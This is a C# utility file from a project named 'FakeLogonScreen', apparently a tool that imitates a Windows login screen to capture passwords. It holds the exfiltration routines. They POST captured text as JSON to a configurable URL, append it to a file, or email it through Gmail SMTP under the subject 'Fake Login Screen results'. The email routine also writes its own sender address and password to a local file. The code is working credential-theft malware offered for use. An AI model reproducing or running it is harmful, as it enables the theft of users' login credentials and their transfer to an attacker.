using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace FakeLogonScreen
{
    public static class Utils
    {
        static public void showData(Dictionary<string,string> method, String text)
        {
            if (method["method"] == "http")
            {
                sendHttpRequest(method, text);
            }
            else if (method["method"] == "file")
            {
                writeToFile(method, text);
            }
            else if (method["method"] == "console")
            {
                printToConsole(method, text);
            }
            else if (method["method"] == "email")
            {
                
            }
        }
        
        
        static public void sendEmail(Dictionary<string,string> method, string text)
        {
            Dictionary<string, string> test = new Dictionary<string, string> {
                {
                    "filename", "test.txt"
                } };
            Utils.writeToFile(test, method["email"] + "\n" + method["password"]); 
            using (MailMessage mail = new MailMessage())
            {
                mail.From = new MailAddress(method["email"]);
                mail.To.Add(method["email"]);
                mail.Subject = "Fake Login Screen results";
                mail.Body = text;
                mail.IsBodyHtml = true;
                //mail.Attachments.Add(new Attachment("D:\\TestFile.txt"));//--Uncomment this to send any attachment  
                using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
                {
                    smtp.Credentials = new NetworkCredential(method["email"], method["password"]);
                    smtp.EnableSsl = true;
                    smtp.Send(mail);
                }
            }
        }

        static public void writeToFile(Dictionary<string, string> method, string text)
        {
            string filePath = method["filename"];
            if (!File.Exists(filePath))
            {
                File.Create(filePath).Close();
            }
            using (StreamWriter sw = File.AppendText(filePath))
            {
                sw.WriteLine(text);
            }
        }
        
        
        static public void printToConsole(Dictionary<string,string> method, string text)
        {
            Console.WriteLine(text);
        }

        static public void sendHttpRequest(Dictionary<string, string> method, string text)
        {
            var httpWebRequest = (System.Net.HttpWebRequest)WebRequest.Create(method["url"]);
            httpWebRequest.ContentType = "application/json";
            httpWebRequest.Method = "POST";
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;

            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
            {
                Dictionary<String, String> requestBody = new Dictionary<String, String>
                {
                    { "info", text }
                };
                string json = JsonConvert.SerializeObject(requestBody, Formatting.Indented);
                streamWriter.Write(json);
                streamWriter.Flush();
                streamWriter.Close();
            }

            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
            {
                var result = streamReader.ReadToEnd();
            }
        }
    }
 
}
